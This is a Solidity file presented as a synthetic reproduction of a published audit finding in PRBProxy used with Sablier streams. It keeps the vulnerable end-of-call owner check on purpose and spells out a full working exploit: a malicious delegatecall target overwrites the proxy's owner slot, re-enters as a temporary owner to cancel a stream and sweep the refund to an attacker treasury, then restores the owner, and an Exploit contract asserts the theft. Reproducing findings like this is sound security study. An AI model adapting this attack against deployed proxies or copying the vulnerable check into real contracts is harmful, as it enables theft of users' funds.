// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Sablier / PRBProxy — Owner can be temporarily changed within proxy calls
    (Zach Obront / Cantina Jul 2023, finding #54672)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: _safeDelegateCall snapshots owner into memory and only checks
    AFTER the delegatecall returns. Mid-call, a malicious target can overwrite
    storage slot 0 (owner), re-enter execute() as the temporary owner, steal
    stream refunds / funds, then restore the original owner so the final check
    passes.

    Vulnerable end-of-call owner check preserved with @> VULN.
    FIX: non-transferable (immutable) owner, or query PRBProxyRegistry for auth. */

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced PRBProxy with the post-delegatecall owner check.
contract PRBProxy {
    // storage slot 0 — targeted by the mid-call owner swap
    address public owner;
    uint256 public minGasReserve = 5000;

    error PRBProxy_OwnerChanged(address originalOwner, address newOwner);

    constructor(address owner_) {
        owner = owner_;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    function execute(address target, bytes calldata data) external payable onlyOwner returns (bytes memory response) {
        (bool success, bytes memory resp) = _safeDelegateCall(target, data);
        if (!success) {
            assembly {
                revert(add(resp, 0x20), mload(resp))
            }
        }
        return resp;
    }

    function _safeDelegateCall(address to, bytes memory data) internal returns (bool success, bytes memory response) {
        // Save the owner address in memory so that this variable cannot be modified during the DELEGATECALL.
        address owner_ = owner;
        // Reserve some gas to ensure that the contract call will not run out of gas.
        uint256 stipend = gasleft() - minGasReserve;
        // Delegate call to the provided contract.
        (success, response) = to.delegatecall{gas: stipend}(data);
        // Check that the owner has not been changed (end-of-call only).
        // FIX: immutable owner / registry-based ownership check before execute
        if (owner_ != owner) { // @> VULN: only checks AFTER the call — mid-call owner swaps are invisible
            revert PRBProxy_OwnerChanged(owner_, owner);
        }
    }

    receive() external payable {}
}

/// @dev Minimal Sablier lockup — cancel refunds deposit to stream.sender.
contract SablierLockup {
    struct Stream {
        address sender;
        address recipient;
        uint256 deposit;
        bool canceled;
    }

    MockToken public asset;
    uint256 public nextId = 1;
    mapping(uint256 => Stream) public streams;

    constructor(MockToken asset_) {
        asset = asset_;
    }

    function create(address sender, address recipient, uint256 deposit) external returns (uint256 id) {
        asset.transfer(address(this), deposit); // pull from msg.sender via prior mint+approve pattern: use transferFrom-less mint path
        // For synthetic simplicity, mint is done to this contract by Exploit.
        id = nextId++;
        streams[id] = Stream(sender, recipient, deposit, false);
    }

    function createFunded(address sender, address recipient, uint256 deposit) external returns (uint256 id) {
        // funds already on this contract
        id = nextId++;
        streams[id] = Stream(sender, recipient, deposit, false);
    }

    function cancel(uint256 streamId) external {
        Stream storage s = streams[streamId];
        require(!s.canceled, "canceled");
        require(msg.sender == s.sender || msg.sender == s.recipient, "not party");
        s.canceled = true;
        asset.transfer(s.sender, s.deposit);
    }
}

/// @dev Temporary owner (Contract B) — cancels streams while it owns the proxy.
contract TempOwner {
    function stealViaProxy(
        PRBProxy proxy,
        SablierLockup lockup,
        uint256 streamId,
        MockToken token,
        address treasury
    ) external {
        // As current owner of proxy, execute a target that cancels and sweeps.
        // Args are calldata (not TempOwner storage) so DELEGATECALL into cancelAndSweep
        // still sees the correct token/treasury addresses.
        proxy.execute(
            address(this),
            abi.encodeCall(this.cancelAndSweep, (lockup, streamId, token, treasury))
        );
    }

    /// @dev Runs via DELEGATECALL from proxy — external calls see msg.sender = proxy.
    function cancelAndSweep(SablierLockup lockup, uint256 streamId, MockToken token, address treasury)
        external
    {
        lockup.cancel(streamId);
        // Refund is now on the proxy (address(this) under DELEGATECALL). Send to treasury.
        uint256 bal = token.balanceOf(address(this));
        token.transfer(treasury, bal);
    }
}

/// @dev Malicious target (Contract A) — mid-call owner swap.
contract MaliciousTarget {
    /// @dev Executed via DELEGATECALL on the proxy. Storage writes hit the proxy.
    function attack(
        TempOwner tempOwner,
        SablierLockup lockup,
        uint256 streamId,
        MockToken token,
        address treasury,
        address realOwner
    ) external {
        // 1) Overwrite proxy.owner (slot 0) with TempOwner.
        assembly {
            sstore(0, tempOwner)
        }
        // 2) TempOwner is now owner — call back into proxy.execute via TempOwner.
        tempOwner.stealViaProxy(PRBProxy(payable(address(this))), lockup, streamId, token, treasury);
        // 3) Restore original owner so the post-check passes.
        assembly {
            sstore(0, realOwner)
        }
    }
}

contract Alice {
    function runExecute(PRBProxy proxy, address target, bytes calldata data) external {
        proxy.execute(target, data);
    }
}

contract AttackerTreasury {}

contract Recipient {
    function cancel(SablierLockup lockup, uint256 id) external {
        lockup.cancel(id);
    }
}

contract Exploit {
    MockToken public token; // 1
    Alice public alice; // 2
    PRBProxy public proxy; // 3 — vulnerable
    SablierLockup public lockup; // 4
    AttackerTreasury public treasury; // 5
    TempOwner public tempOwner; // 6
    MaliciousTarget public malTarget; // 7
    Recipient public recipient; // 8
    uint256 public streamId;
    uint256 public constant REFUND = 1000e18;

    constructor() {
        token = new MockToken();
        alice = new Alice();
        proxy = new PRBProxy(address(alice));
        lockup = new SablierLockup(token);
        treasury = new AttackerTreasury();
        tempOwner = new TempOwner();
        malTarget = new MaliciousTarget();
        recipient = new Recipient();
        // Fund lockup with stream deposit; stream sender = proxy.
        token.mint(address(lockup), REFUND);
        streamId = lockup.createFunded(address(proxy), address(recipient), REFUND);
    }

    function run() external {
        uint256 beforeTreasury = token.balanceOf(address(treasury));
        uint256 beforeAlice = token.balanceOf(address(alice));

        // Alice executes malicious target via proxy — mid-call owner swap steals refund.
        bytes memory attackData = abi.encodeCall(
            MaliciousTarget.attack,
            (tempOwner, lockup, streamId, token, address(treasury), address(alice))
        );
        alice.runExecute(proxy, address(malTarget), attackData);

        // Final owner restored (post-check passed).
        require(proxy.owner() == address(alice), "owner not restored");

        // HARM: cancel refund stolen by temporary owner path → treasury.
        require(token.balanceOf(address(treasury)) == beforeTreasury + REFUND, "treasury not paid");
        require(token.balanceOf(address(alice)) == beforeAlice, "alice should not receive refund");
        require(token.balanceOf(address(proxy)) == 0, "proxy empty");
    }
}
